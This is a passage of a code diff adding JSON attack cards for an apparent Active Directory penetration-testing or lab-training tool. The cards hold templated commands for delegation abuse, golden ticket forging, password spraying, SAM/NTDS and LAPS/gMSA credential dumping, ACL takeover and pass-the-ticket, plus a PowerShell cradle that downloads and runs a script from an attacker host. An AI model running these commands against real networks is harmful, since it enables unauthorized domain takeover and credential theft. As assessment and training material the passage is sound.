+    "ad.computer_added",
+    "ad.control_paths"
+   ],
+   "produces": [
+    "hash.tgt",
+    "foothold.windows"
+   ],
+   "priority": 86,
+   "proves": "establishes a TGT, a Windows foothold",
+   "does_not_prove": "crackable/reusable material — not a validated credential until cracked or validated",
+   "report": {
+    "finding": "Kerberos Delegation Abuse Path",
+    "severity": "critical"
+   },
+   "refs": [],
+   "commands": [
+    {
+     "tool": "rubeus",
+     "run": "Rubeus.exe monitor /interval:5 /filteruser:{{dc_account}}",
+     "note": "On an unconstrained-delegation host you control: watch for the DC TGT after coercion."
+    },
+    {
+     "tool": "impacket-addcomputer",
+     "run": "impacket-addcomputer {{domain}}/{{user}}:{{password}} -dc-ip {{target}} -computer-name OBOL$ -computer-pass {{password}}",
+     "note": "RBCD step 1: add a machine account you control (if quota allows). Used by ntlmrelayx --add-computer too."
+    },
+    {
+     "tool": "impacket-rbcd",
+     "run": "impacket-rbcd -delegate-from OBOL$ -delegate-to {{target_sam}} -action write {{domain}}/{{user}}:{{password}}",
+     "note": "RBCD step 2: grant your machine delegation rights on the target. Then getST -spn cifs/target -impersonate administrator."
+    }
+   ]
+  },
+  {
+   "id": "golden-ticket",
+   "title": "Golden Ticket (Post-Domain-Admin)",
+   "hypothesis": "With the krbtgt hash (from DCSync or NTDS) you can forge TGTs for any user with any group membership — persistence that survives password resets of every account except krbtgt itself. This is post-compromise proof and persistence, not an entry vector.",
+   "tool": "impacket-ticketer",
+   "tools": [
+    "impacket-ticketer"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "hash.krbtgt"
+   ],
+   "produces": [
+    "persistence.domain"
+   ],
+   "priority": 96,
+   "proves": "establishes domain persistence",
+   "does_not_prove": "persistence — established only from existing domain control",
+   "report": {
+    "finding": "Domain Persistence via Golden Ticket",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/gentilkiwi/mimikatz",
+    "https://github.com/fortra/impacket"
+   ],
+   "commands": [
+    {
+     "tool": "impacket-ticketer",
+     "run": "impacket-ticketer -nthash {{hash}} -domain-sid {{domain_sid}} -domain {{domain}} administrator",
+     "note": "Forge a TGT. Get the domain SID via lookupsid or BloodHound. Export the ccache, then use -k flags with impacket tools."
+    }
+   ]
+  },
+  {
+   "id": "trust-enum",
+   "title": "Trust Relationships & Forest Hopping",
+   "hypothesis": "Domains and forests linked by trusts may authenticate each other's users — and trust misconfigurations turn one compromised domain into two. Enumerate trusts after any domain foothold; BloodHound maps them, and foreign group membership (a user from domain A in a privileged group of domain B) is the classic hop.",
+   "tool": "nltest",
+   "tools": [
+    "nltest",
+    "impacket-lookupsid"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "credential.available",
+    "ad.graph.collected"
+   ],
+   "produces": [
+    "ad.trusts"
+   ],
+   "priority": 70,
+   "proves": "establishes domain trusts",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "Exploitable Domain Trust Relationship",
+    "severity": "high"
+   },
+   "refs": [],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "nltest /domain_trusts",
+     "note": "From a domain-joined foothold: list trusts the fast way."
+    },
+    {
+     "tool": "sh",
+     "run": "Get-DomainTrust | ? {$_.TrustAttributes -match 'WITHIN_FOREST|FOREST_TRANSITIVE'}",
+     "note": "PowerView: trusts with attributes. BloodHound's \"Map Domain Trusts\" query visualizes the same."
+    },
+    {
+     "tool": "impacket-lookupsid",
+     "run": "impacket-lookupsid '{{domain}}/{{user}}:{{password}}'@{{target}}",
+     "note": "SID enumeration on a trusted domain to enumerate its users through the trust."
+    }
+   ]
+  },
+  {
+   "id": "zerologon-check",
+   "title": "Zerologon Check (CVE-2020-1472) — Detection Only",
+   "hypothesis": "Zerologon lets an unauthenticated attacker reset a DC machine account password and take the domain. The CHECK is safe and worth running; the EXPLOIT resets the DC's machine password and can break the domain if not restored perfectly — destructive-class, and you must restore the original password from your own dump afterward. Verify patch level, think twice, document either way.",
+   "tool": "zerologon-scan",
+   "tools": [
+    "zerologon-scan"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "ad.dc_candidate"
+   ],
+   "produces": [
+    "vuln.candidates"
+   ],
+   "priority": 55,
+   "proves": "establishes vulnerability candidates",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "Zerologon Vulnerability (CVE-2020-1472)",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/SecuraBV/CVE-2020-1472"
+   ],
+   "commands": [
+    {
+     "tool": "zerologon-scan",
+     "run": "zerologon-scan '{{dc_netbios}}' {{target}}",
+     "note": "Safe detection only. Confirms vulnerability WITHOUT changing anything."
+    }
+   ]
+  },
+  {
+   "id": "wsus-abuse",
+   "title": "WSUS Abuse",
+   "hypothesis": "WSUS servers push updates to every Windows machine in the domain — over plain HTTP in misconfigured deployments. Relay or MITM the update channel and you can push a fake \"update\" (SharpWSUS/WSUSpendu) that runs as SYSTEM on every client that checks in. Look for WSUS when you have a relay position or a compromised server.",
+   "tool": "sharpwsus",
+   "tools": [
+    "sharpwsus"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "relay.success",
+    "access.admin"
+   ],
+   "produces": [
+    "access.system",
+    "persistence.domain"
+   ],
+   "priority": 96,
+   "proves": "establishes SYSTEM access, domain persistence",
+   "does_not_prove": "SYSTEM on this host — not domain-wide control",
+   "report": {
+    "finding": "WSUS Update Channel Abuse",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/wsus-spoofing"
+   ],
+   "commands": [
+    {
+     "tool": "sharpwsus",
+     "run": "SharpWSUS.exe locate",
+     "note": "From a foothold: find the WSUS server via registry/GPO."
+    },
+    {
+     "tool": "sharpwsus",
+     "run": "SharpWSUS.exe inspect",
+     "note": "Confirm whether updates flow over HTTP (abusable) or HTTPS (much harder)."
+    }
+   ]
+  },
+  {
+   "id": "sccm-enum",
+   "title": "SCCM/MECM Enumeration & Abuse",
+   "hypothesis": "SCCM manages software deployment across the fleet — compromise it and you push code to everything as SYSTEM. Even before that, SCCM enumeration leaks credentials (network access accounts, task sequences with embedded passwords) via LDAP and the site's SMB shares. SharpSCCM and sccmhunter are the toolkits.",
+   "tool": "sccmhunter",
+   "tools": [
+    "sccmhunter",
+    "SharpSCCM"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "credential.available"
+   ],
+   "produces": [
+    "credential.candidate",
+    "ad.attack_paths"
+   ],
+   "priority": 84,
+   "proves": "establishes candidate credentials, attack paths",
+   "does_not_prove": "candidate material only — not a validated credential, and not access",
+   "report": {
+    "finding": "SCCM Credential Exposure",
+    "severity": "high"
+   },
+   "refs": [
+    "https://github.com/Mayyhem/SharpSCCM"
+   ],
+   "commands": [
+    {
+     "tool": "sccmhunter",
+     "run": "sccmhunter.py find -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}}",
+     "note": "Locate SCCM site servers and management points from LDAP."
+    },
+    {
+     "tool": "sccmhunter",
+     "run": "sccmhunter.py smb -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}}",
+     "note": "Enumerate SCCM shares — task sequences and scripts with embedded creds live here."
+    }
+   ]
+  },
+  {
+   "id": "nxc-arsenal",
+   "title": "NetExec Arsenal (One Tool, Most of AD)",
+   "hypothesis": "NetExec is the AD multitool: enumeration, validation, spidering, roasting, dumping, and execution checks, all with the same auth syntax. Learn the flag families once and you can drive most of a domain assessment from one tool. This card is the cheat sheet; the Tools view collects every nxc command in one place.",
+   "tool": "nxc",
+   "tools": [
+    "nxc"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "smb.reachable",
+    "port:445",
+    "credential.available"
+   ],
+   "produces": [
+    "enum.deep",
+    "credential.candidate"
+   ],
+   "priority": 74,
+   "proves": "establishes deep enumeration, candidate credentials",
+   "does_not_prove": "candidate material only — not a validated credential, and not access",
+   "report": {
+    "finding": "Credential Access and Reuse via SMB/WinRM",
+    "severity": "high"
+   },
+   "refs": [
+    "https://www.netexec.wiki/",
+    "https://github.com/netexec-community/nxc"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u {{userlist}} -p {{password}}",
+     "note": "Spray/validate: one password across users. --continue-on-success to keep going after a hit."
+    },
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u {{user}} -p {{password}} --users --groups --shares",
+     "note": "Authenticated pull: users, groups, and share permissions in one shot."
+    },
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u {{user}} -p {{password}} -M spider_plus",
+     "note": "Share spider: dumps a JSON inventory of every readable file. Grep the output for creds/configs/keys."
+    },
+    {
+     "tool": "nxc",
+     "run": "nxc ldap {{target}} -u {{user}} -p {{password}} --asreproast {{hashfile}}",
+     "note": "AS-REP roast via nxc — no Impacket needed."
+    },
+    {
+     "tool": "nxc",
+     "run": "nxc ldap {{target}} -u {{user}} -p {{password}} --kerberoasting {{hashfile}}",
+     "note": "Kerberoast via nxc."
+    },
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u {{user}} -H {{hash}}",
+     "note": "Pass-the-hash validation: where does this hash work? Point it at the whole subnet to find reuse."
+    },
+    {
+     "tool": "nxc",
+     "run": "nxc smb {{target}} -u {{user}} -p {{password}} --sam",
+     "note": "Pwned box: dump local SAM hashes. --lsa for LSA secrets, --ntds on a DC for the domain database."
+    },
+    {
+     "tool": "nxc",
+     "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -x \"whoami\"",
+     "note": "Execution check over WinRM — confirms shell-level access without a full session."
+    }
+   ]
+  },
+  {
+   "id": "kerberos-tickets",
+   "title": "Kerberos Ticket Hygiene (The Stuff Everyone Forgets)",
+   "hypothesis": "Half of all \"impacket is broken\" moments in AD labs are Kerberos hygiene: clock skew over 5 minutes kills authentication, tools need tickets via KRB5CCNAME, and kinit/getTGT are how you get them. Sync time FIRST on any AD box, then manage tickets explicitly.",
+   "tool": "ntpdate",
+   "tools": [
+    "ntpdate",
+    "impacket-getTGT",
+    "kinit",
+    "klist"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "kerberos.reachable",
+    "ad.dc_candidate"
+   ],
+   "produces": [
+    "kerberos.tickets"
+   ],
+   "priority": 78,
+   "proves": "establishes Kerberos tickets",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "",
+    "severity": "informational"
+   },
+   "refs": [
+    "https://github.com/GhostPack/Rubeus",
+    "https://github.com/gentilkiwi/mimikatz"
+   ],
+   "commands": [
+    {
+     "tool": "ntpdate",
+     "run": "sudo ntpdate -u {{target}}",
+     "note": "Sync your clock to the DC FIRST. KDC_ERR_SKEW is the #1 silent killer in AD labs. faketime is the alternative when the DC time is deliberately wrong."
+    },
+    {
+     "tool": "impacket-getTGT",
+     "run": "impacket-getTGT '{{domain}}/{{user}}:{{password}}'",
+     "note": "Plaintext to ccache ticket."
+    },
+    {
+     "tool": "impacket-getTGT",
+     "run": "impacket-getTGT -hashes ':{{hash}}' '{{domain}}/{{user}}'",
+     "note": "Hash variant — same ticket, no password needed."
+    },
+    {
+     "tool": "sh",
+     "run": "export KRB5CCNAME={{user}}.ccache && klist",
+     "note": "Point the environment at your ticket, then verify it. Now every impacket -k flag and kinit-based tool works."
+    },
+    {
+     "tool": "kinit",
+     "run": "kinit {{user}}@{{domain}}",
+     "note": "MIT-tools alternative; prompts for the password. Keytabs work too: kinit -k -t {{file}} {{user}}@{{domain}}."
+    }
+   ]
+  },
+  {
+   "id": "bloodyad-acl",
+   "title": "ACL Abuse with bloodyAD",
+   "hypothesis": "Modern AD privilege paths are ACL paths: GenericAll, WriteDacl, WriteOwner, or group-membership write rights over an object let you escalate by editing the directory — add yourself to groups, take ownership, grant yourself control, force password resets, or set up shadow credentials. BloodHound shows which edges you hold; bloodyAD executes them from Linux without RSAT.",
+   "tool": "bloodyad",
+   "tools": [
+    "bloodyad",
+    "impacket-dacledit"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "credential.available",
+    "ad.attack_paths"
+   ],
+   "produces": [
+    "ad.control_paths",
+    "credential.candidate"
+   ],
+   "priority": 84,
+   "proves": "establishes object-control paths, candidate credentials",
+   "does_not_prove": "candidate material only — not a validated credential, and not access",
+   "report": {
+    "finding": "ACL-Based Privilege Escalation Path",
+    "severity": "high"
+   },
+   "refs": [
+    "https://www.thehacker.recipes/ad/movement/dacl",
+    "https://github.com/CravateRouge/bloodyAD"
+   ],
+   "commands": [
+    {
+     "tool": "bloodyad",
+     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail",
+     "note": "Start here: what can your account actually write? The detail output is your menu."
+    },
+    {
+     "tool": "bloodyad",
+     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add groupMember \"{{group}}\" {{user}}",
+     "note": "Group-write edge: add yourself (or a controlled account) to the target group. Re-login/re-ticket for it to take effect."
+    },
+    {
+     "tool": "bloodyad",
+     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' set owner {{target_sam}} {{user}}",
+     "note": "WriteOwner edge: seize ownership of the object..."
+    },
+    {
+     "tool": "bloodyad",
+     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add genericAll {{target_sam}} {{user}}",
+     "note": "...then grant yourself GenericAll. Now you can reset its password, targeted-Kerberoast it, or add shadow credentials."
+    },
+    {
+     "tool": "impacket-dacledit",
+     "run": "impacket-dacledit -action write -rights FullControl -principal {{user}} -target {{target_sam}} '{{domain}}/{{user}}:{{password}}'",
+     "note": "Impacket alternative when bloodyAD is not installed."
+    }
+   ]
+  },
+  {
+   "id": "getst-impersonation",
+   "title": "S4U Impersonation (getST)",
+   "hypothesis": "Constrained delegation and resource-based constrained delegation let a service account request service tickets as ANY user — including Administrator — via the S4U2self/S4U2proxy extensions. getST -impersonate is the payoff command for the whole delegation lane: it turns delegation rights into a cifs/host ticket as admin on the target.",
+   "tool": "impacket-getST",
+   "tools": [
+    "impacket-getST"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "ad.computer_added",
+    "ad.control_paths"
+   ],
+   "produces": [
+    "kerberos.tickets",
+    "access.admin"
+   ],
+   "priority": 92,
+   "proves": "establishes Kerberos tickets, administrative access",
+   "does_not_prove": "administrative access in this host/context — not domain dominance unless separately proven",
+   "report": {
+    "finding": "Delegation-Based Impersonation to Administrator",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/fortra/impacket"
+   ],
+   "commands": [
+    {
+     "tool": "impacket-getST",
+     "run": "impacket-getST -spn 'cifs/{{target_sam}}' -impersonate administrator '{{domain}}/{{user}}:{{password}}'",
+     "note": "RBCD payoff: ticket as administrator to the target service. Use the FQDN of the target in the SPN."
+    },
+    {
+     "tool": "impacket-getST",
+     "run": "impacket-getST -spn 'cifs/{{target_sam}}' -impersonate administrator -hashes ':{{hash}}' '{{domain}}/{{user}}'",
+     "note": "Hash variant for machine accounts or when you only hold NTLM."
+    },
+    {
+     "tool": "sh",
+     "run": "export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass '{{target_sam}}'",
+     "note": "Use the ticket: -k -no-pass with the ccache gets you execution as the impersonated user."
+    }
+   ]
+  },
+  {
+   "id": "gmsa-read",
+   "title": "gMSA Password Read",
+   "hypothesis": "Group Managed Service Accounts have long random passwords managed by AD — but the PrincipalsAllowedToRetrieveManagedPassword property decides who may READ the current password blob. If a group you can join (or already hold) is listed, the gMSA password is yours: no cracking, no coercion. BloodHound shows this as ReadGMSAPassword edges; when it shows nothing, enumerate the attribute directly (the corpus Haze pattern).",
+   "tool": "bloodyAD",
+   "tools": [
+    "bloodyAD"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [
+    "credential.available"
+   ],
+   "requires_any": [
+    "ldap.reachable",
+    "ad.control_paths"
+   ],
+   "produces": [
+    "credential.ntlm_hash",
+    "credential.available"
+   ],
+   "priority": 88,
+   "proves": "establishes an NT hash, a usable credential",
+   "does_not_prove": "a usable credential — not access until it authenticates against a service",
+   "report": {
+    "finding": "gMSA Password Readable by Non-Admin Principal",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://www.thehacker.recipes/ad/movement/ds-creds/gmsa",
+    "https://github.com/micahvandeusen/gMSADumper"
+   ],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword",
+     "note": "PowerShell on a domain-joined foothold: list gMSAs and who can read each password. Group names like gMSA_Managers are the tell."
+    },
+    {
+     "tool": "bloodyAD",
+     "run": "bloodyAD --host {{target}} -d {{domain}} -u {{user}} -p '{{password}}' get object '<gmsa-sam>$' --attr msDS-ManagedPassword",
+     "note": "If you are an allowed principal, this returns the password blob; decode the NTLM with a gMSA parser (gMSADumper, DSInternals, or a short python struct unpack)."
+    }
+   ]
+  },
+  {
+   "id": "laps-read",
+   "title": "LAPS Local Admin Password Read",
+   "hypothesis": "LAPS stores each machine local admin password in a computer attribute (ms-Mcs-AdmPwd / msLAPS-Password). Read rights are delegated — frequently to helpdesk or workstation-admin groups you can get into. One attribute read = local admin on that box, and lab local-admin passwords are reused everywhere.",
+   "tool": "nxc",
+   "tools": [
+    "nxc"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [
+    "credential.available"
+   ],
+   "requires_any": [
+    "ldap.reachable",
+    "ad.control_paths"
+   ],
+   "produces": [
+    "credential.plaintext",
+    "access.admin"
+   ],
+   "priority": 92,
+   "proves": "establishes a plaintext password, administrative access",
+   "does_not_prove": "a usable credential — not access until it authenticates against a service",
+   "report": {
+    "finding": "LAPS Passwords Readable by Non-Admin",
+    "severity": "high"
+   },
+   "refs": [
+    "https://www.thehacker.recipes/ad/movement/ds-creds/laps"
+   ],
+   "commands": [
+    {
+     "tool": "nxc",
+     "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M laps",
+     "note": "NetExec module dumps readable LAPS passwords for all computers in one shot."
+    },
+    {
+     "tool": "sh",
+     "run": "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name,ms-Mcs-AdmPwd",
+     "note": "PowerShell variant on a domain-joined host. Legacy LAPS attribute; Windows LAPS uses msLAPS-Password (encrypted — needs the LAPS PowerShell module or laps.py to decrypt)."
+    }
+   ]
+  },
+  {
+   "id": "ticket-reuse",
+   "title": "Pass-the-Ticket / Overpass-the-Hash",
+   "hypothesis": "Stolen or forged Kerberos tickets (.kirbi / ccache) work without knowing any password — you ARE that principal until expiry. On Windows, Rubeus injects tickets into the session; on Linux, point KRB5CCNAME at the ccache file and impacket -k does the rest. Also: an NTLM hash converts to a TGT via overpass-the-hash (Rubeus asktgt / getTGT with -hashes), giving you Kerberos where only NTLM was available.",
+   "tool": "rubeus",
+   "tools": [
+    "rubeus",
+    "impacket-psexec"
+   ],
+   "os": [
+    "windows",
+    "linux"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "kerberos.tickets",
+    "credential.ntlm_hash",
+    "hash.ntlm"
+   ],
+   "produces": [
+    "access.admin",
+    "lateral.movement"
+   ],
+   "priority": 92,
+   "proves": "establishes administrative access, lateral.movement",
+   "does_not_prove": "administrative access in this host/context — not domain dominance unless separately proven",
+   "report": {
+    "finding": "Kerberos Ticket Theft and Reuse",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://www.thehacker.recipes/ad/movement/kerberos/ptt"
+   ],
+   "commands": [
+    {
+     "tool": "rubeus",
+     "run": "Rubeus.exe ptt /ticket:{{file}}",
+     "note": "Windows: inject a .kirbi ticket into the current session (pass-the-ticket). klist confirms."
+    },
+    {
+     "tool": "rubeus",
+     "run": "Rubeus.exe asktgt /user:{{user}} /rc4:{{hash}} /ptt",
+     "note": "Overpass-the-hash: NTLM hash → TGT, injected directly."
+    },
+    {
+     "tool": "sh",
+     "run": "export KRB5CCNAME={{file}} && impacket-psexec -k -no-pass {{domain}}/{{user}}@{{target_sam}}.{{domain}}",
+     "note": "Linux: ccache ticket + any impacket tool with -k -no-pass. ticketConverter.py converts kirbi to ccache and back."
+    }
+   ]
+  },
+  {
+   "id": "powerview-enum",
+   "title": "PowerView Enumeration (from a Windows Foothold)",
+   "hypothesis": "Once you are ON a domain-joined Windows box, PowerView gives deep AD recon from the inside without any extra privileges: users, groups, computers, SPN accounts (kerberoast targets), sessions, local-admin mapping, share hunting. It answers the questions BloodHound graphs ask, interactively. Import it to memory, then work the questions below in order — each one produces a named, actionable list.",
+   "tool": "powershell",
+   "tools": [
+    "powershell"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "foothold.windows"
+   ],
+   "produces": [
+    "ad.attack_paths",
+    "ad.control_paths",
+    "ad.user_list"
+   ],
+   "priority": 84,
+   "proves": "establishes attack paths, object-control paths, a domain user list",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "",
+    "severity": "informational"
+   },
+   "refs": [
+    "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon"
+   ],
+   "commands": [
+    {
+     "tool": "powershell",
+     "run": "IEX(New-Object Net.WebClient).downloadString('http://{{lhost}}:8000/PowerView.ps1')",
+     "note": "In-memory load from your HTTP server. Offline/file variant: Import-Module .\\PowerView.ps1 (run powershell -ep bypass first). AMSI note: plain-text download cradles get flagged on modern boxes — if blocked, fall back to the .NET/ADSI card (ad-psdotnet-enum)."
+    },
+    {
+     "tool": "powershell",
+     "run": "Get-NetDomain",
+     "note": "Domain basics: forest, DCs, and PdcRoleOwner (the DC to query). Replaces the manual .NET GetCurrentDomain() call."
+    },
+    {
+     "tool": "powershell",
+     "run": "Get-NetUser | select cn,pwdlastset,lastlogon",
+     "note": "All users with password age and last logon. Dormant accounts (never logged on, old pwdlastset) are quiet takeover targets; passwords unchanged since a policy change are often weak. Get-NetUser | select cn for the clean list."
+    },
+    {
+     "tool": "powershell",
+     "run": "Get-NetGroup | select cn",
+     "note": "All groups. Then Get-NetGroup \"Sales Department\" | select member for membership — nested groups show as DNs; chase them one level down."
+    },
+    {
+     "tool": "powershell",
+     "run": "Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion",
+     "note": "Every machine with OS and build — oldest OS is usually the softest target, and build numbers feed patch-gap analysis."
+    },
+    {
+     "tool": "powershell",
+     "run": "Get-NetUser -SPN | select samaccountname,serviceprincipalname",
+     "note": "Kerberoast targets from the inside — service accounts with SPNs. Same answer GetUserSPNs gets from outside; the SPN itself reveals the service and host (resolve with nslookup)."
+    },
+    {
+     "tool": "powershell",
+     "run": "Find-LocalAdminAccess",
+     "note": "Where does YOUR current user have local admin? The classic lateral-movement oracle. Takes minutes on big domains — let it run."
+    },
+    {
+     "tool": "powershell",
+     "run": "Get-NetSession -ComputerName {{target}}",
+     "note": "Who is logged in where (NetSessionEnum). Note: modern Windows (10 1709+/11, Server 2019+) restricts this to admins — Access Denied is the OS, not you. Older boxes still answer."
+    },
+    {
+     "tool": "powershell",
+     "run": "Invoke-ShareFinder -Verbose | Select-String -Pattern 'READ'",
+     "note": "Hunt readable shares across the domain; loot them for configs and creds (see stored-credentials)."
+    }
+   ]
+  },
+  {
+   "id": "ad-legacy-enum",
+   "title": "AD Enumeration with Built-In Windows Tools",
+   "hypothesis": "No uploads, no AMSI, no signatures: net.exe, setspn, and nltest ship with Windows and answer most first-pass AD questions — users, groups, group membership, SPNs, DCs, password policy. On a fresh Windows foothold these are your first five minutes, and they work from any domain-joined context, even heavily monitored ones. RDP in rather than WinRM when you can: PowerShell Remoting sessions run into the Kerberos double-hop problem and cannot always query the DC, while an RDP session has no such limit.",
+   "tool": "xfreerdp",
+   "tools": [
+    "xfreerdp",
+    "cmd"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "foothold.windows",
+    "access.desktop"
+   ],
+   "produces": [
+    "ad.user_list",
+    "ad.attack_paths"
+   ],
+   "priority": 84,
+   "proves": "establishes a domain user list, attack paths",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "",
+    "severity": "informational"
+   },
+   "refs": [],
+   "commands": [
+    {
+     "tool": "xfreerdp",
+     "run": "xfreerdp /v:{{target}} /u:{{user}} /p:'{{password}}' /d:{{domain}} /cert:ignore +clipboard /dynamic-resolution",
+     "note": "Get a real desktop first. OffSec doctrine: prefer RDP over WinRM for enumeration — WinRM hits the Kerberos double-hop problem (your session cannot re-authenticate to the DC for some queries). /cert:ignore quiets prompts."
+    },
+    {
+     "tool": "cmd",
+     "run": "net user /domain",
+     "note": "Every domain user. Then per-user detail: net user {{user}} /domain — group memberships, last logon, password age, account flags."
+    },
+    {
+     "tool": "cmd",
+     "run": "net group /domain",
+     "note": "Every domain group. Membership: net group \"Domain Admins\" /domain — quote multiword names. net localgroup administrators on a specific host shows local admins."
+    },
+    {
+     "tool": "cmd",
+     "run": "net accounts /domain",
+     "note": "Domain password and lockout policy — REQUIRED reading before any spraying (see password-spray). Lockout threshold minus one is your budget."
+    },
+    {
+     "tool": "cmd",
+     "run": "setspn -L {{user}}",
+     "note": "SPNs registered to a service account (installed by default). HTTP/, MSSQLSvc/, termsrv/ SPNs reveal services AND kerberoast targets without a port scan. nslookup the SPN hostname to get its internal IP."
+    },
+    {
+     "tool": "cmd",
+     "run": "nltest /dclist:{{domain}}",
+     "note": "Domain controllers. Also: nltest /domain_trusts for trust relationships (see trust-enum)."
+    }
+   ]
+  },
+  {
+   "id": "ad-psdotnet-enum",
+   "title": "AD Enumeration via PowerShell + .NET (No PowerView)",
+   "hypothesis": "When PowerView is signatured or missing, raw .NET classes do the same job with zero imports: System.DirectoryServices.ActiveDirectory finds the PDC, ADSI resolves the domain DN, and DirectorySearcher runs arbitrary LDAP queries. Nothing gets written to disk beyond a script you type yourself, and there are no known signatures to trip. This is the OffSec PEN-200 approach: build the LDAPSearch function once, reuse it for everything.",
+   "tool": "powershell",
+   "tools": [
+    "powershell"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "foothold.windows",
+    "access.desktop"
+   ],
+   "produces": [
+    "ad.user_list",
+    "ad.attack_paths"
+   ],
+   "priority": 84,
+   "proves": "establishes a domain user list, attack paths",
+   "does_not_prove": "enumeration/context only — no access, credential, or privilege",
+   "report": {
+    "finding": "",
+    "severity": "informational"
+   },
+   "refs": [],
+   "commands": [
+    {
+     "tool": "powershell",
+     "run": "powershell -ep bypass",
+     "note": "Bypass execution policy first so scripts/functions actually load. -ep bypass is per-process and not a system change."
+    },
+    {
+     "tool": "powershell",
+     "run": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()",
+     "note": "Domain object: forest, DCs, and PdcRoleOwner — the DC with the freshest data. $PDC = ...GetCurrentDomain().PdcRoleOwner.Name"
+    },
+    {
+     "tool": "powershell",
+     "run": "([adsi]'').distinguishedName",
+     "note": "One-liner for the domain DN (DC=corp,DC=com). No imports needed."
+    },
+    {
+     "tool": "powershell",
+     "run": "function LDAPSearch { param([string]$LDAPQuery) $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DistinguishedName = ([adsi]\"''\").distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$PDC/$DistinguishedName\"); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }",
+     "note": "The reusable function — paste this whole line, or save as function.ps1 and Import-Module it. Every query below is one LDAPSearch call."
+    },
+    {
+     "tool": "powershell",
+     "run": "LDAPSearch -LDAPQuery \"(samAccountType=805306368)\"",
+     "note": "All user objects. 805306368 = user account type. Add .properties.samaccountname for clean names."
+    },
+    {
+     "tool": "powershell",
+     "run": "LDAPSearch -LDAPQuery \"(objectclass=group)\"",
+     "note": "All groups. For membership: LDAPSearch -LDAPQuery \"(&(objectCategory=group)(cn=Sales Department))\" | ForEach-Object { $_.properties.member }"
+    },
+    {
+     "tool": "powershell",
+     "run": "LDAPSearch -LDAPQuery \"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\"",
+     "note": "SPN-bearing users = kerberoast targets, found without PowerView. Also try (adminCount=1) for protected/privileged accounts and (!(userAccountControl:1.2.840.113556.1.4.803:=2)) for enabled accounts only."
+    }
+   ]
+  },
+  {
+   "id": "ad-acl-abuse",
+   "title": "Object ACL Abuse (GenericAll and Friends)",
+   "hypothesis": "AD objects carry ACLs, and misconfigured ones are free privilege: GenericAll on a group means you can add yourself to it; ForceChangePassword on a user means you can reset their password; WriteDACL/WriteOwner means you can grant yourself everything. The interesting rights: GenericAll, GenericWrite, WriteOwner, WriteDACL, AllExtendedRights, ForceChangePassword, Self (add-self). Enumerate with PowerView from a foothold, convert SIDs to names, then act with plain net.exe. A regular user holding GenericAll on anything interesting is a misconfiguration and a finding.",
+   "tool": "powershell",
+   "tools": [
+    "powershell",
+    "cmd"
+   ],
+   "os": [
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "foothold.windows",
+    "ad.attack_paths"
+   ],
+   "produces": [
+    "ad.control_paths",
+    "access.admin"
+   ],
+   "priority": 92,
+   "proves": "establishes object-control paths, administrative access",
